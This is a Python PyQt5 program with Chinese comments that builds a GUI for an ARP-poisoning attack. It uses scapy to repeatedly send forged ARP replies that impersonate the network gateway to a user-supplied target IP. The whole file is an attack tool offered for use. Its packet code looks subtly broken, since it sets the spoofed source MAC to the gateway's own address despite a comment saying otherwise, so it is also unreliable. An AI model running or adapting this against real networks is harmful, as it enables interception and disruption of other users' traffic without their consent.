# ---------- encoding：UTF-8 ------------
# author:liu     time:2021/3/9

from PyQt5 import QtWidgets
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5 import uic
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, get_if_hwaddr, getmacbyip
import netifaces  # 这个获取本机的所有网关，接口interface
import time

# 本机IP地址和本机Mac地址
local_ip = ARP().psrc
local_mac = ARP().hwsrc
print(local_ip + ' + ' + local_mac)

# 获取网关地址和mac地址
gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
gateway_mac = getmacbyip(gateway_ip)
print(gateway_ip + ' + ' + gateway_mac)


class myThread1(QThread):
    s1 = pyqtSignal(str)

    def __init__(self, ip=None):
        super(myThread1, self).__init__()
        self.flag = True
        self.target_ip = ip

    def run(self):
        print('3333333')
        try:
            while self.flag:
                print('44444444')
                arp = arp_pkt(gateway_ip, gateway_mac, self.target_ip, getmacbyip(self.target_ip))
                send(arp)
                self.s1.emit('[*****]正在arp攻击[*****]')
                time.sleep(2)
            self.s1.emit("[*****]arp攻击结束[*****]")
        except Exception as e:
            print(e)

    def stop(self):
        self.flag = False


def arp_pkt(gateway_ip, gateway_mac, target_ip, target_mac):
    print('2222222')
    poison_target = ARP()
    poison_target.op = 2  # 1是请求，2是响应
    poison_target.hwsrc = gateway_mac  # 默认指向本机地址
    poison_target.psrc = gateway_ip

    poison_target.hwdst = target_mac
    poison_target.pdst = target_ip

    return poison_target


class ARP_Attack(QDialog):
    stop_singnal = pyqtSignal()

    def __init__(self):
        super(ARP_Attack, self).__init__()
        self.ini_UI()

    def ini_UI(self):
        self.ui_attack = uic.loadUi('arp_attack.ui', self)  # 注意最后这个self，没有它不会显示这个页面
        self.ui_attack.setWindowTitle('arp攻击')
        self.ui_attack.setWindowIcon(QIcon('../picture/黑客.png'))
        # self.ui_attack.lineEdit.setText("arp攻击窗口")

        self.thread = None

        self.connector()

        # 信号与槽连接

    def connector(self):
        self.ui_attack.buttonAttack.clicked.connect(lambda: self.startOrstop("start"))
        self.ui_attack.buttonStop.clicked.connect(lambda: self.startOrstop("stop"))

    def startOrstop(self, text):
        tip = self.ui_attack.lineEdit.text()
        print(tip)
        try:
            # print('111111')

            if text == "start":
                print('开始')
                self.thread = myThread1(ip=tip)  # 创建主线程
                self.thread.start()  # 执行run函数
                self.thread.s1.connect(self.display_message)
            elif text == "stop":
                print('结束')
                self.stop_singnal.connect(self.thread.stop)
                self.stop_singnal.emit()

        except Exception as e:
            print(e)

    def display_message(self, message):
        self.ui_attack.textEdit.setText(message)


if __name__ == '__main__':
    app = QApplication([])

    arp_attack = ARP_Attack()

    app.exec_()
